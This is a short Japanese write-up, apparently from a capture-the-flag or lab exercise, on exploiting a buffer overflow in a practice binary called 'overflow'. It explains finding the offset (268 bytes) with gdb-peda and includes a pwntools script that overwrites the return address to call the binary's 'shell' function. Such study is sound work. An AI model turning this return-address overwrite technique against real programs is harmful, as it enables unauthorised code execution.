# overflow
バッファオーバーフローを利用して、プログラムに存在する関数を呼び出す。
ここではシェルを開く関数shellを用意した。
PIEが無効になっているのでアドレスは変動しない。
そのため、pwntoolsやreadelfなどの解析ツールで直接アドレスを知ることができる。
gdb-pedaを使うと、文字列からリターンアドレスを書き換えている位置を特定することができる。
pattcで生成、pattoで位置の特定となる。
この場合268だった。
したがって、最初に268バイト分パディングして、次に呼び出したい関数のアドレスを指定すればいい。
引数が必要ならリターンアドレスの後に順に入れていけばよいはず。

```py
from pwn import *

trg = ELF('overflow')
retaddr = trg.symbols['shell']
offset = 268

payload = 'A' * offset
payload += p32(retaddr)

p = process('overflow')
p.sendline(payload)
p.interactive()
```
